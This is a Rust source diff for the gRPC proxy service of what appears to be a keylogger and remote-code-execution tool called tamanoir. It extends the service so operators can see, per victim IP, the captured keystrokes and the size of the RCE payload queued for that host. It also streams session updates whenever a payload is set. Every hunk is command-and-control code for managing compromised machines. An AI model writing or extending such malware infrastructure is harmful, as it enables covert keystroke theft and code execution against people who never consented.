@@ -7,7 +7,7 @@ use tonic::{transport::Server, Request, Response, Status};
 use crate::{
     tamanoir_grpc::{
         proxy_server::{Proxy, ProxyServer},
-        ListSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
+        ListSessionsResponse, NoArgs, SessionRcePayload, SessionResponse, SetSessionRceRequest,
     },
     Session, SessionsStore, TargetArch,
 };
@@ -37,9 +37,17 @@ impl Proxy for SessionsStore {
 
         let mut sessions: Vec<SessionResponse> = vec![];
         for s in current_sessions.values().into_iter() {
+            let rce_payload: Option<SessionRcePayload> = match &s.rce_payload {
+                Some(payload) => Some(SessionRcePayload {
+                    length: payload.length as u32,
+                    buffer_length: payload.buffer.len() as u32,
+                }),
+                _ => None,
+            };
             sessions.push(SessionResponse {
                 ip: s.ip.to_string(),
                 key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
+                rce_payload: rce_payload,
             })
         }
 
@@ -70,7 +78,10 @@ impl Proxy for SessionsStore {
         match current_sessions.get_mut(&ip) {
             Some(existing_session) => {
                 match existing_session.set_rce_payload(&req.rce, target_arch) {
-                    Ok(_) => Ok(Response::new(NoArgs {})),
+                    Ok(_) => {
+                        self.tx.send(Some(existing_session.clone())).unwrap();
+                        Ok(Response::new(NoArgs {}))
+                    }
                     Err(_) => Err(Status::new(404.into(), format!("{}: invalid rce", req.rce))),
                 }
             }
@@ -92,9 +103,15 @@ impl Proxy for SessionsStore {
         let stream = async_stream::try_stream! {
         while let Ok(maybe_session) = rx.recv().await {
             if let Some(session) = maybe_session {
-               yield SessionResponse {
+                let rce_payload:Option<SessionRcePayload> = match session.rce_payload   {
+                    Some(payload) => Some(SessionRcePayload {length:payload.length as u32,buffer_length:payload.buffer.len() as u32}),
+                    _ => None,
+                };
+
+                yield SessionResponse {
                     ip: session.ip.to_string(),
                     key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
+                    rce_payload: rce_payload
                 };
 
             }
